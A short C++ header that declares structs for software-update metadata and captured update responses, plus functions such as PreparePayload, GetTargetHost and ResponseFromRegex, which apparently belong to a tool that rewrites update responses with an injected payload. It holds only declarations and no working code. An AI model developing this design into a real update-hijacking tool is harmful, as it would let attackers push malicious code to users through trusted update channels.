

#ifndef HELPER_H_H_H
#define HELPER_H_H_H

#include <string>
#include <vector>

#define MAX_VERSION_SIZE 8

using namespace std;


#pragma pack(1)

typedef struct {
	char* name;
	void* ptr;
}CRYPT_ALGORITHM;


typedef struct {
	string name;
	string version;
	int fs;
	string md5;
	string sha1;
	string sha256;	
	string url;
}UPDATE_INFORMATION;


struct UpdateData {
	string url;
	string host;
	char* response;
	int respSize;
};

#pragma pack()

extern vector < UpdateData> gUpdateData;

string GetMainFileName(string fn);

int PreparePayload(string server, string user);

int ObjectParser(vector<string>& targetHost, string server, string user);

int GetTargetHost(vector<string>& targetHost);

int ResponseFromRegex(char * buf,const char* regex, const  char* format, int payloadLen, const char* payload);

string ObjectFromRegex( char* regex, char* format,string version, vector<UPDATE_INFORMATION>);


class Helper {
public:
	
	static int GetSdkVersion(char * szsdkver, char * szversions[8]);
};


#endif